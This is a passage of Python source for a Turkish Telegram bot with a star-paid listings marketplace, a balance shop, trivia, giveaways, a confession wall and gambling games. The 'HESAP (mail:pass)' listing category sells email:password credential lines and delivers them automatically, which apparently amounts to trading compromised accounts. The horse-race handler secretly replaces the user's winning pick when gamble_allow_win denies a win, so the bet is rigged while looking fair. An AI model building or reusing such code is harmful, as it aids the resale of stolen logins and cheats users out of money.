    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("📧 HESAP (mail:pass)", callback_data="ilan_cat_HESAP"),
      types.InlineKeyboardButton("🎮 MT", callback_data="ilan_cat_MT"),
      types.InlineKeyboardButton("❌ İptal", callback_data="cancel_ilan_add"),
    )
    bot.send_message(
      chat_id,
      "📢 **İlan Ekle**\n\n"
      "Kategori seç:\n"
      "• **HESAP** — mail:pass satırları\n"
      "• **MT** — metin + stok adedi\n\n"
      "Fiyat **yıldız (⭐)** ile.\n"
      "Admin onayından sonra yayınlanır.\n"
      "Alıcı yıldız ödeyince stok **otomatik teslim** edilir.",
      reply_markup=markup,
      parse_mode="Markdown",
    )

  elif call.data == "cancel_ilan_add":
    safe_answer("İptal edildi.")
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    try: bot.delete_message(chat_id, call.message.message_id)
    except: pass
    bot.send_message(chat_id, "❌ İlan işlemi iptal edildi.", reply_markup=types.ReplyKeyboardRemove())
    ana_menu_goster(chat_id, user_id)

  elif call.data.startswith("ilan_cat_"):
    safe_answer()
    cat = call.data.replace("ilan_cat_", "").upper()
    if cat not in ("HESAP", "MT"):
      bot.send_message(chat_id, "❌ Geçersiz kategori.")
      return
    admin_temp_data.setdefault(chat_id, {}).setdefault('new_listing', {})['category'] = cat
    user_states[chat_id] = "waiting_ilan_title"
    bot.send_message(
      chat_id,
      f"🏷 Kategori: **{cat}**\n\n"
      f"Adım 1/4: İlan **başlığını** yaz:",
      parse_mode="Markdown",
    )
  elif call.data == "ilan_list":
    safe_answer()
    if not listings:
      bot.send_message(chat_id, "📭 Aktif ilan yok.")
      return
    for l_id, item in listings.items():
      stock_val = item.get('stock', len(item.get('stock_items') or []) or 1)
      owner_str = f"@{item['owner_username']}" if item.get('owner_username') else f"`{item.get('user_id')}`"
      cat = item.get('category', 'GENEL')
      stars = int(item.get('price_stars') or item.get('price') or 0)
      caption = (
        f"📢 **İlan:** `{l_id}`\n"
        f"🏷 **{cat}**\n"
        f"👤 Satıcı: {owner_str}\n"
        f"🏷️ {item.get('title')}\n"
        f"⭐ **Fiyat: {stars} yıldız**\n"
        f"📦 Stok: {stock_val}\n"
        f"📄 {item.get('desc', '-')}"
      )
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton(f"⭐ Satın Al ({stars}⭐)", callback_data=f"buy_ilan_{l_id}"))
      if item.get('photo'):
        bot.send_photo(chat_id, item['photo'], caption=caption, reply_markup=markup, parse_mode="Markdown")
      else:
        bot.send_message(chat_id, caption, reply_markup=markup, parse_mode="Markdown")
  elif call.data == "confirm_publish_ilan":
    safe_answer()
    listing_data = admin_temp_data.get(chat_id, {}).get("new_listing")
    if listing_data:
      temp_id = str(uuid.uuid4())[:8]
      owner_username = call.from_user.username if call.from_user.username else None
      cat = (listing_data.get("category") or "HESAP").upper()
      stock_items = listing_data.get("stock_items") or []
      if isinstance(stock_items, str):
        stock_items = [ln.strip() for ln in stock_items.splitlines() if ln.strip()]
      mt_text = (listing_data.get("mt_text") or "").strip()
      if cat == "MT":
        stock_n = int(listing_data.get("stock") or 1)
        stock_items = []
      else:
        stock_n = len(stock_items)
      pending_listing_approvals[temp_id] = {
        "user_id": user_id,
        "owner_username": owner_username,
        "category": cat,
        "title": listing_data.get("title"),
        "price_stars": int(listing_data.get("price_stars") or listing_data.get("price") or 1),
        "desc": listing_data.get("desc", ""),
        "stock_items": list(stock_items),
        "stock": stock_n,
        "mt_text": mt_text,
        "photo": listing_data.get("photo"),
        "time": get_current_time_str(),
      }
      save_data()
      log_activity("ilan_pending", user_id, listing_data.get("title", ""))
      try:
        bot.edit_message_text(
          chat_id=chat_id,
          message_id=call.message.message_id,
          text=(call.message.text or "") + "\n\n**⏳ ADMIN ONAYI BEKLENİYOR**",
          parse_mode="Markdown",
        )
      except Exception:
        try:
          bot.edit_message_caption(
            chat_id=chat_id,
            message_id=call.message.message_id,
            caption=(call.message.caption or "") + "\n\n**⏳ ADMIN ONAYI BEKLENİYOR**",
            parse_mode="Markdown",
          )
        except Exception:
          pass
      bot.send_message(
        chat_id,
        f"⏳ İlan admin onayına gönderildi.\n🆔 `{temp_id}`\n\n"
        f"📦 Stok adedi: **{stock_n}** (içerik sadece adminde)",
        parse_mode="Markdown",
      )
      am = types.InlineKeyboardMarkup(row_width=2)
      am.add(
        types.InlineKeyboardButton("✅ Yayınla", callback_data=f"admin_ilan_ok_{temp_id}"),
        types.InlineKeyboardButton("❌ Reddet", callback_data=f"admin_ilan_no_{temp_id}"),
      )
      pdata = pending_listing_approvals[temp_id]
      if cat == "MT":
        content_block = f"📝 **MT metin:**\n`{mt_text[:1500]}`\n📦 Stok adedi: **{stock_n}**"
      else:
        lines_preview = "\n".join(f"`{x}`" for x in (stock_items[:40]))
        if len(stock_items) > 40:
          lines_preview += f"\n… +{len(stock_items)-40} satır"
        content_block = f"📧 **HESAP stok ({stock_n}):**\n{lines_preview or '(boş)'}"
      admin_txt = (
        f"📢 **YENİ İLAN ONAYI** `{temp_id}`\n\n"
        f"👤 `{user_id}` @{owner_username or '-'}\n"
        f"🏷 **{cat}**\n"
        f"🏷️ {pdata.get('title')}\n"
        f"⭐ {pdata.get('price_stars')} yıldız\n"
        f"📄 {str(pdata.get('desc', ''))[:200]}\n\n"
        f"{content_block}\n\n"
        f"_Satıcıya stok içeriği gösterilmedi._"
      )
      for admin_id in list(admin_ids_set):
        try:
          if pdata.get("photo"):
            bot.send_photo(admin_id, pdata["photo"], caption=admin_txt[:1000], reply_markup=am, parse_mode="Markdown")
            if len(admin_txt) > 1000:
              bot.send_message(admin_id, admin_txt, reply_markup=am, parse_mode="Markdown")
          else:
            bot.send_message(admin_id, admin_txt, reply_markup=am, parse_mode="Markdown")
        except Exception:
          try:
            bot.send_message(admin_id, admin_txt[:3500], reply_markup=am)
          except Exception:
            pass
    admin_temp_data.pop(chat_id, None)

  elif call.data == "cancel_publish_ilan":
    safe_answer("İptal edildi.")
    try: bot.delete_message(chat_id, call.message.message_id)
    except: pass
    bot.send_message(chat_id, "❌ İptal edildi.")
    admin_temp_data.pop(chat_id, None)

  elif call.data == "cancel_ilan_pay":
    safe_answer("İptal.")
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    try:
      bot.send_message(chat_id, "❌ Satın alma iptal edildi.")
    except Exception:
      pass

  elif call.data.startswith("buy_ilan_"):
    l_id = call.data.split("_")[2]
    if l_id not in listings:
      safe_answer("❌ Bu ilan artık mevcut değil!", show_alert=True)
      return
    item = listings[l_id]
    if item.get("user_id") == user_id:
      safe_answer("❌ Kendi ilanını alamazsın!", show_alert=True)
      return
    stars = int(item.get("price_stars") or item.get("price") or 0)
    if stars < 1:
      safe_answer("❌ Geçersiz fiyat (yıldız)!", show_alert=True)
      return
    stock = int(item.get("stock") or len(item.get("stock_items") or []) or 0)
    if stock < 1 and not (item.get("stock_items") or []):
      safe_answer("❌ Stok yok!", show_alert=True)
      return
    safe_answer()
    start_ilan_star_purchase(chat_id, user_id, l_id)
  elif call.data == "cancel_buy_ilan":
    safe_answer("İptal edildi.")
    try: bot.delete_message(chat_id, call.message.message_id)
    except: pass
    bot.send_message(chat_id, "❌ İptal edildi.")
    ana_menu_goster(chat_id, user_id)

  elif call.data == "menu_market":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    for key, item in market_data.items():
      if "stock_file" in item:
        if not os.path.exists(item["stock_file"]):
          with open(item["stock_file"], "w", encoding="utf-8") as f:
            f.write("")
        stock_count = len(get_stock_list(item["stock_file"]))
      else:
        stock_count = 0
      btn_text = f"🛒 {item['name']} - {item['price']} TL (Stok: {stock_count})"
      markup.add(types.InlineKeyboardButton(btn_text, callback_data=f"buy_market_{key}"))

    markup.add(types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu"))
    try: bot.edit_message_text(t(user_id, "market_title", bal=user_balances.get(user_id, 0.0)), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data.startswith("buy_market_"):
    item_key = call.data.split("_", 2)[2]
    if item_key not in market_data:
      safe_answer("❌ Ürün yok!", show_alert=True)
      return
    item = market_data[item_key]
    if "stock_file" not in item:
      safe_answer("❌ Stok dosyası yok!", show_alert=True)
      return
    stock_count = len(get_stock_list(item["stock_file"]))
    if stock_count <= 0:
      safe_answer("❌ Stok bitmiş!", show_alert=True)
      return
    max_qty = min(int(MAX_MARKET_BUY_QTY), stock_count)
    price = float(item["price"])
    disc = get_level_discount(user_id)
    unit_price = round(price * (1.0 - disc), 2)
    bakiye = float(user_balances.get(user_id, 0.0) or 0.0)
    max_by_bal = int(bakiye // unit_price) if unit_price > 0 else 0
    if max_by_bal < 1:
      safe_answer(f"❌ Yetersiz Bakiye! (1 adet = {unit_price} TL)", show_alert=True)
      return
    max_qty = min(max_qty, max_by_bal)
    admin_temp_data[chat_id] = {
      "market_item_key": item_key,
      "market_unit_price": unit_price,
      "market_base_price": price,
      "market_disc": disc,
      "market_max_qty": max_qty,
    }
    user_states[chat_id] = "waiting_market_qty"
    safe_answer()
    disc_txt = f"\n🏷️ Level indirimi: **%{int(disc*100)}**" if disc > 0 else ""
    bot.send_message(
      chat_id,
      f"🛒 **{item['name']}**\n"
      f"💵 Birim: **{unit_price:.2f} TL**{disc_txt}\n"
      f"📦 Stok: **{stock_count}**\n"
      f"🔢 Max alım: **{max_qty}** (üst limit {MAX_MARKET_BUY_QTY})\n\n"
      f"Kaç adet almak istiyorsun? (1–{max_qty})\n"
      f"İptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "menu_quiz":
    safe_answer()
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("▶️ Soru gelsin (10 sn)", callback_data="quiz_start"))
    markup.add(types.InlineKeyboardButton("🔙", callback_data="menu_sosyal"))
    bot.send_message(
      chat_id,
      "🧠 **Kürdistan Bilgisi**\n"
      "Bakur · Başûr · Rojava · Rojhilat\n"
      "• 10 saniye · Doğru **+2** · Yanlış **-1** TL",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data == "quiz_start":
    safe_answer()
    if float(user_balances.get(user_id, 0) or 0) < 1:
      bot.send_message(chat_id, "En az 1 TL bakiye lazım (yanlışta -1).")
      return
    bank = [
      ("Kürdistan'ın dört parçası hangileridir?", ["Bakur · Başûr · Rojava · Rojhilat", "Sadece Bakur", "Sadece Rojava", "Avrupa · Asya"], 0),
      ("Bakur hangi coğrafyayı ifade eder?", ["Kuzey (Türkiye tarafı)", "Güney Amerika", "Uzak Doğu", "Kuzey Kutbu"], 0),
      ("Başûr hangi coğrafyayı ifade eder?", ["Güney (Irak Kürdistanı)", "Batı Avrupa", "Güney Afrika", "Pasifik"], 0),
      ("Rojava hangi coğrafyayı ifade eder?", ["Batı (Suriye tarafı)", "Doğu Asya", "Kuzey Amerika", "Antarktika"], 0),
      ("Rojhilat hangi coğrafyayı ifade eder?", ["Doğu (İran tarafı)", "Batı Avrupa", "Avustralya", "İskandinavya"], 0),
      ("Hewlêr (Erbil) hangi parçadadır?", ["Başûr", "Rojava", "Rojhilat", "Bakur değil"], 0),
      ("Amed (Diyarbakır) hangi parçadadır?", ["Bakur", "Başûr", "Rojava", "Rojhilat"], 0),
      ("Qamişlo hangi parçadadır?", ["Rojava", "Başûr", "Rojhilat", "Bakur"], 0),
      ("Mahabad hangi parçaya yakındır?", ["Rojhilat", "Rojava", "Bakur-sadece", "Başûr-sadece"], 0),
      ("Newroz neyi simgeler?", ["Nevruz / bahar / yenilenme", "Kış uykusu", "Deniz festivali", "Uzay günü"], 0),
      ("Kürtçe dil ailesi?", ["Hint-Avrupa", "Çince", "Japonca", "Bantu"], 0),
      ("Dört parça bir arada nasıl anılır?", ["Birleşik Kürdistan coğrafyası", "Sadece bir şehir", "Bir ada", "Bir okyanus"], 0),
      ("Van Gölü hangi parçaya yakındır?", ["Bakur", "Rojava", "Başûr-merkez", "Rojhilat-merkez"], 0),
      ("Silêmanî (Süleymaniye) hangi parça?", ["Başûr", "Rojava", "Rojhilat", "Bakur"], 0),
      ("Zagros dağları Kürdistan coğrafyasında önemli müdür?", ["Evet, doğu-güney hattında", "Hayır, sadece Avrupa'da", "Sadece denizdir", "Yoktur"], 0),
      ("Kürtçede 'roj' ne anlama gelir?", ["Gün / güneş", "Gece", "Deniz", "Kar"], 0),
    ]
    q, opts, ans = random.choice(bank)
    quiz_active[user_id] = {"ans": ans, "t": time.time(), "opts": opts, "q": q}
    markup = types.InlineKeyboardMarkup(row_width=1)
    for i, o in enumerate(opts):
      markup.add(types.InlineKeyboardButton(o, callback_data=f"quiz_ans_{i}"))
    bot.send_message(
      chat_id,
      f"🧠 **10 saniye!**\n\n{q}\n\n_Süre dolarsa -1 TL_",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data.startswith("quiz_ans_"):
    safe_answer()
    st = quiz_active.get(user_id)
    if not st:
      bot.send_message(chat_id, "Aktif soru yok. Yeni soru aç.")
      return
    try:
      idx = int(call.data.split("_")[-1])
    except Exception:
      return
    elapsed = time.time() - float(st.get("t") or 0)
    quiz_active.pop(user_id, None)
    if elapsed > 10.5:
      user_balances[user_id] = max(0.0, float(user_balances.get(user_id, 0) or 0) - 1.0)
      save_data()
      bot.send_message(chat_id, f"⏱ Süre doldu (−1 TL)\n💵 **{user_balances.get(user_id, 0):.2f} TL**", parse_mode="Markdown")
      return
    if idx == int(st.get("ans")):
      user_balances[user_id] = float(user_balances.get(user_id, 0) or 0) + 2.0
      save_data()
      bot.send_message(chat_id, f"✅ Doğru! **+2 TL**\n💵 **{user_balances.get(user_id, 0):.2f} TL**", parse_mode="Markdown")
    else:
      user_balances[user_id] = max(0.0, float(user_balances.get(user_id, 0) or 0) - 1.0)
      save_data()
      correct = (st.get("opts") or [""])[int(st.get("ans"))]
      bot.send_message(chat_id, f"❌ Yanlış (−1 TL)\nDoğru: **{correct}**\n💵 **{user_balances.get(user_id, 0):.2f} TL**", parse_mode="Markdown")
    return

  elif call.data.startswith("horse_pick_"):
    safe_answer()
    try:
      pick = int(call.data.split("_")[-1])
    except Exception:
      return
    bet = float((admin_temp_data.get(chat_id) or {}).get("horse_bet") or 0)
    if bet <= 0:
      bot.send_message(chat_id, "Bahis yok, tekrar dene.")
      return
    if get_gamble_bal(user_id) < bet:
      bot.send_message(chat_id, "Yetersiz kumar bakiyesi.")
      return
    add_gamble_bal(user_id, -bet)
    try:
      add_to_jackpot(bet)
    except Exception:
      pass
    speeds = [random.random() for _ in HORSE_NAMES]
    winner = max(range(len(speeds)), key=lambda i: speeds[i])
    try:
      allow = gamble_allow_win(user_id)
    except Exception:
      allow = random.random() < 0.2
    if not allow and pick == winner:
      others = [i for i in range(len(HORSE_NAMES)) if i != pick]
      winner = random.choice(others)
    lines = ["🏇 **Yarış!**\n"]
    order = sorted(range(len(speeds)), key=lambda i: -speeds[i])
    for rank, i in enumerate(order, 1):
      mark = "👈" if i == pick else ""
      lines.append(f"{rank}. {HORSE_NAMES[i]} {mark}")
    if pick == winner:
      mult = 4.5  # 6 at
      win = bet * mult
      add_gamble_bal(user_id, win)
      try:
        update_gambling_profit(user_id, win - bet)
      except Exception:
        pass
      lines.append(f"\n✅ **Kazandın!** +{win:.2f} TL ({mult}x)")
    else:
      try:
        update_gambling_profit(user_id, -bet)
      except Exception:
        pass
      lines.append(f"\n❌ Kaybettin (−{bet:.0f} TL)\nKazanan: **{HORSE_NAMES[winner]}**")
    save_data()
    lines.append(f"\n🎲 Kumar: **{get_gamble_bal(user_id):.2f} TL**")
    admin_temp_data.pop(chat_id, None)
    bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")
    return

  elif call.data.startswith("chdrop_"):
    safe_answer()
    code = call.data.replace("chdrop_", "", 1)
    drop = channel_drop_active.get(code)
    if not drop or drop.get("claimed"):
      try:
        bot.answer_callback_query(call.id, "geç kaldın", show_alert=True)
      except Exception:
        pass
      try:
        mid = (drop or {}).get("msg_id") or (call.message.message_id if call.message else None)
        cid = (drop or {}).get("chat_id") or (call.message.chat.id if call.message else None)
        if mid and cid:
          bot.delete_message(cid, mid)
      except Exception:
        pass
      return
    drop["claimed"] = True
    try:
      add_norm_bal(user_id, CHANNEL_DROP_REWARD)
    except Exception:
      user_balances[user_id] = float(user_balances.get(user_id, 0) or 0) + CHANNEL_DROP_REWARD
    try:
      save_data()
    except Exception:
      pass
    try:
      mid = drop.get("msg_id") or (call.message.message_id if call.message else None)
      cid = drop.get("chat_id") or (call.message.chat.id if call.message else None)
      if mid and cid:
        bot.delete_message(cid, mid)
    except Exception:
      try:
        bot.edit_message_reply_markup(
          drop.get("chat_id") or chat_id,
          drop.get("msg_id") or call.message.message_id,
          reply_markup=None,
        )
      except Exception:
        pass
    try:
      bot.answer_callback_query(call.id, f"+{int(CHANNEL_DROP_REWARD)} TL", show_alert=True)
    except Exception:
      pass
    try:
      bot.send_message(user_id, f"+{int(CHANNEL_DROP_REWARD)} TL kanal hediyesi")
    except Exception:
      pass
    return

  elif call.data == "menu_sosyal":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
      types.InlineKeyboardButton("😶 İtiraf Duvarı", callback_data="menu_itiraf"),
      types.InlineKeyboardButton("❓ Günün Sorusu", callback_data="menu_gunun_soru"),
      types.InlineKeyboardButton("🎁 Çekiliş", callback_data="menu_cekilis"),
      types.InlineKeyboardButton("✅ Günlük Çekiliş", callback_data="daily_cekilis_info"),
      types.InlineKeyboardButton("🤥 Bot ne diyor?", callback_data="fake_lie"),
      types.InlineKeyboardButton("🌙 Gece Modu", callback_data="night_mode_info"),
      types.InlineKeyboardButton("🎡 Çark (1/gün)", callback_data="menu_cark"),
      types.InlineKeyboardButton("🕳 Karadelik", callback_data="menu_karadelik"),
      types.InlineKeyboardButton("📈 Kripto Borsa", callback_data="menu_borsa"),
      types.InlineKeyboardButton("🧠 Kürdistan Bilgi", callback_data="menu_quiz"),
      types.InlineKeyboardButton("🔤 Metin Araç", callback_data="menu_metin"),
      types.InlineKeyboardButton("⚔️ 1v1 Bahis", callback_data="menu_duello"),
    )
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    night = " 🌙" if is_night_mode() else ""
    bot.send_message(chat_id, f"🎭 **Sosyal & Eğlence**{night}", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "fake_lie":
    safe_answer()
    lie = get_fake_lie(user_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔄 Başka yalan", callback_data="fake_lie"))
    markup.add(types.InlineKeyboardButton("🔙 Sosyal", callback_data="menu_sosyal"))
    bot.send_message(
      chat_id,
      f"🤥 **Bot senin hakkında yalan söylüyor:**\n\n{lie}\n\n_Hepsi uydurma. İnanma._",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data == "night_mode_info":
    safe_answer()
    active = is_night_mode()
    try:
      uid = int(user_id)
    except Exception:
      uid = user_id
    owl = uid in user_night_badges
    if active:
      mark_night_owl(user_id)
      owl = True
    ch = effective_jackpot_chance()
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Sosyal", callback_data="menu_sosyal"))
    status = "🟢 **AÇIK**" if active else "⚪ Kapalı (00:00–06:00 arası açılır)"
    bot.send_message(
      chat_id,
      f"🌙 **Gece Modu**\n\n"
      f"Durum: {status}\n"
      f"🎰 Jackpot şansı: **%{ch*100:.1f}** "
      f"({'x'+str(NIGHT_JACKPOT_MULT)+' gece çarpanı' if active else 'normal'})\n"
      f"🦉 Gece Kuşu rozeti: {'✅ var' if owl else '❌ yok (gece girince alınır)'}\n\n"
      f"Gece saatlerinde menüde ay belirir, jackpot daha cömert olur.",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data == "daily_cekilis_info":
    safe_answer()
    text = _cekilis_status_text()
    markup = types.InlineKeyboardMarkup()
    dc = daily_cekilis or {}
    if dc.get("active") and not dc.get("winner"):
      markup.add(types.InlineKeyboardButton("✅ Çekilişe Katıl", callback_data="daily_cekilis_join"))
    if user_id in admin_ids_set:
      if dc.get("active") and not dc.get("winner"):
        markup.add(types.InlineKeyboardButton("🏁 Admin: Anında Açıkla", callback_data="daily_cekilis_force_draw"))
      markup.add(types.InlineKeyboardButton("♻️ Admin: Yeniden Başlat", callback_data="daily_cekilis_restart"))
    markup.add(types.InlineKeyboardButton("🔙 Sosyal", callback_data="menu_sosyal"))
    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "daily_cekilis_join":
    ok, msg = join_daily_cekilis(user_id)
    # Kanaldan tıklanınca chat_id = kanal; mesajı kanala yazma
    is_channel = False
    try:
      is_channel = int(chat_id) < 0
    except Exception:
      is_channel = False
    alert_txt = (msg or "").replace("**", "").replace("`", "")[:180]
    safe_answer(alert_txt if alert_txt else ("OK" if ok else "Hata"), show_alert=True)
    # Özel sohbete onay gönder (botu daha önce açmışsa)
    try:
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton("🔙 Çekiliş", callback_data="daily_cekilis_info"))
      markup.add(types.InlineKeyboardButton("🏠 Ana Menü", callback_data="main_menu"))
      bot.send_message(user_id, msg, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      # Kullanıcı botu hiç açmamış olabilir — sadece alert yeterli
      pass
    # Private chat'ten geldiyse ekstra mesaj zaten gitti; kanaldan geldiyse ekstra kanal mesajı yok
    if not is_channel and int(chat_id) == int(user_id):
      pass  # DM zaten user_id'ye gitti
    return

  elif call.data == "daily_cekilis_restart":
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    safe_answer()
    start_daily_cekilis(force_new=True)
    bot.send_message(chat_id, "✅ Günlük çekiliş yeniden başlatıldı ve kanala duyuruldu.", parse_mode="Markdown")
    return

  elif call.data == "daily_cekilis_force_draw":
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    dc = daily_cekilis or {}
    if not dc.get("active") or dc.get("winner"):
      safe_answer("Aktif çekiliş yok", show_alert=True)
      return
    ents = list(dc.get("entrants") or [])
    if not ents:
      safe_answer("Katılımcı yok", show_alert=True)
      bot.send_message(chat_id, "❌ Hiç katılımcı yok, açıklanamaz.")
      return
    safe_answer()
    n_ents = len(ents)
    result = draw_daily_cekilis(force=True)
    if not result:
      bot.send_message(chat_id, "❌ Açıklanamadı.")
      return
    bot.send_message(
      chat_id,
      f"🏁 **Admin anında açıkladı**\n\n{result}\n\n👥 Katılımcı: **{n_ents}** (min {CEKILIS_MIN_PLAYERS} beklenmedi)",
      parse_mode="Markdown",
    )
    try:
      log_activity("cekilis_force_draw", user_id, f"n={n_ents}")
    except Exception:
      pass
    return

  elif call.data == "menu_itiraf":
    safe_answer()
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✍️ İtiraf yaz", callback_data="itiraf_yaz"))
    markup.add(types.InlineKeyboardButton("📖 Duvarı oku", callback_data="itiraf_oku"))
    if user_id in admin_ids_set:
      markup.add(types.InlineKeyboardButton("🗑 Admin: sil", callback_data="itiraf_admin_sil"))
    markup.add(types.InlineKeyboardButton("🔙 Sosyal", callback_data="menu_sosyal"))
    bot.send_message(
      chat_id,
      "😶 **İtiraf Duvarı**\nAnonim · silinmez (sadece admin siler)",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data == "itiraf_yaz":
    safe_answer()
    user_states[chat_id] = "waiting_confession"
    bot.send_message(chat_id, "İtirafını yaz (anonim yayınlanır).\n/iptal")
    return

  elif call.data == "itiraf_oku":
    safe_answer()
    visible = [c for c in confessions if not c.get("hidden")][-30:]
    if not visible:
      bot.send_message(chat_id, "Henüz itiraf yok.")
      return
    lines = ["😶 **Son itiraflar** (anonim)\n"]
    for c in reversed(visible):
      lines.append(f"`#{c.get('id')}` — {c.get('text', '')[:200]}")
    bot.send_message(chat_id, "\n".join(lines)[:3500], parse_mode="Markdown")
    return

  elif call.data == "itiraf_admin_sil":
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    safe_answer()
    user_states[chat_id] = "waiting_confession_del"
    bot.send_message(chat_id, "Silinecek itiraf ID yaz (örn 3a1b):\n/iptal")
    return

  elif call.data == "menu_gunun_soru":
    safe_answer()
    dq = daily_question or {}
    if not dq.get("active") or not dq.get("q"):
      if user_id in admin_ids_set:
        user_states[chat_id] = "waiting_daily_q"
        bot.send_message(chat_id, "Admin: soruyu yaz.\nSonra şıkları `şık1|şık2|şık3` formatında göndereceksin.")
      else:
        bot.send_message(chat_id, "Bugün soru yok.")
      return
    markup = types.InlineKeyboardMarkup(row_width=1)
    for i, opt in enumerate(dq.get("opts") or []):
      markup.add(types.InlineKeyboardButton(opt, callback_data=f"dq_vote_{i}"))
    markup.add(types.InlineKeyboardButton("📊 Sonuç", callback_data="dq_sonuc"))
    markup.add(types.InlineKeyboardButton("🔙", callback_data="menu_sosyal"))
    bot.send_message(chat_id, f"❓ **{dq.get('q')}**", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("dq_vote_"):
    safe_answer()
    dq = daily_question or {}
    if not dq.get("active"):
      bot.send_message(chat_id, "Soru kapalı.")
      return
    if user_id in (dq.get("votes") or {}):
      safe_answer("Zaten oy verdin", show_alert=True)
      return
    try:
      idx = int(call.data.split("_")[-1])
    except Exception:
      return
    daily_question.setdefault("votes", {})[user_id] = idx
    save_data()
    bot.send_message(chat_id, "✅ Oy kaydedildi.")
    return

  elif call.data == "dq_sonuc":
    safe_answer()
    dq = daily_question or {}
    opts = dq.get("opts") or []
    counts = [0] * len(opts)
    for _, idx in (dq.get("votes") or {}).items():
      if 0 <= int(idx) < len(counts):
        counts[int(idx)] += 1
    lines = [f"📊 **{dq.get('q')}**\n"]
    for i, o in enumerate(opts):
      lines.append(f"• {o}: **{counts[i]}**")
    bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")
    return

  elif call.data == "menu_cekilis":
    safe_answer()
    active = [(gid, g) for gid, g in giveaways.items() if g.get("active")]
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Günlük Kanal Çekilişi", callback_data="daily_cekilis_info"))
    if user_id in admin_ids_set:
      dc0 = daily_cekilis or {}
      if dc0.get("active") and not dc0.get("winner"):
        markup.add(types.InlineKeyboardButton("🏁 Günlük çekilişi anında açıkla", callback_data="daily_cekilis_force_draw"))
      markup.add(types.InlineKeyboardButton("➕ Çekiliş aç (admin)", callback_data="cekilis_admin_new"))
      markup.add(types.InlineKeyboardButton("🏁 Diğer çekiliş bitir", callback_data="cekilis_admin_end"))
    for gid, g in active[:10]:
      markup.add(types.InlineKeyboardButton(
        f"🎁 {g.get('title', gid)[:20]} ({len(g.get('entrants') or [])})",
        callback_data=f"cekilis_katil_{gid}",
      ))
    markup.add(types.InlineKeyboardButton("🔙", callback_data="menu_sosyal"))
    extra = ""
    dc = daily_cekilis or {}
    if dc.get("active") and not dc.get("winner"):
      extra = f"\n\n📢 Günlük: **{float(dc.get('prize') or 0):.0f} TL** · {len(dc.get('entrants') or [])}/{CEKILIS_MIN_PLAYERS}"
    bot.send_message(chat_id, f"🎁 **Çekilişler**{extra}", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("cekilis_katil_"):
    safe_answer()
    gid = call.data.replace("cekilis_katil_", "", 1)
    g = giveaways.get(gid)
    if not g or not g.get("active"):
      bot.send_message(chat_id, "Çekiliş yok.")
      return
    cost = float(g.get("cost") or 0)
    if cost > 0:
      if user_balances.get(user_id, 0) < cost:
        bot.send_message(chat_id, "Yetersiz bakiye.")
        return
      user_balances[user_id] = user_balances.get(user_id, 0) - cost
    ents = g.setdefault("entrants", [])
    if user_id in ents:
      bot.send_message(chat_id, "Zaten katıldın.")
      return
    ents.append(user_id)
    save_data()
    bot.send_message(chat_id, f"✅ Katıldın: **{g.get('title')}**", parse_mode="Markdown")
    return

  elif call.data == "cekilis_admin_new":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    user_states[chat_id] = "waiting_giveaway"
    bot.send_message(chat_id, "Format: `başlık|ödül|katılım_ücreti_TL`\nÖrn: `iPhone|telefon|5`", parse_mode="Markdown")
    return

  elif call.data == "cekilis_admin_end":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    active = [(gid, g) for gid, g in giveaways.items() if g.get("active")]
    if not active:
      bot.send_message(chat_id, "Aktif çekiliş yok.")
      return
    gid, g = active[0]
    ents = g.get("entrants") or []
    if not ents:
      g["active"] = False
      save_data()
      bot.send_message(chat_id, "Katılımcı yok, kapatıldı.")
      return
    winner = random.choice(ents)
    g["active"] = False
    g["winner"] = winner
    save_data()
    bot.send_message(chat_id, f"🏁 Kazanan: `{winner}`\n🎁 {g.get('title')} — {g.get('prize')}", parse_mode="Markdown")
    try:
      bot.send_message(winner, f"🎁 Çekiliş kazandın: **{g.get('title')}**\n{g.get('prize')}", parse_mode="Markdown")
    except Exception:
      pass
    return

  elif call.data == "menu_cark":
    safe_answer()
    today = datetime.now().strftime("%Y-%m-%d")
    if wheel_last.get(user_id) == today:
      bot.send_message(chat_id, "🎡 Bugün çevirdin. Yarın tekrar.")
      return
    prizes = [
      (0.55, 0, "Boş"),
      (0.25, 5, "+5 TL"),
      (0.12, 15, "+15 TL"),
      (0.06, 40, "+40 TL"),
      (0.02, 100, "+100 TL"),
    ]
    r = random.random()
    acc = 0
    reward, label = 0, "Boş"
    for p, amt, lab in prizes:
      acc += p
      if r <= acc:
        reward, label = amt, lab
        break
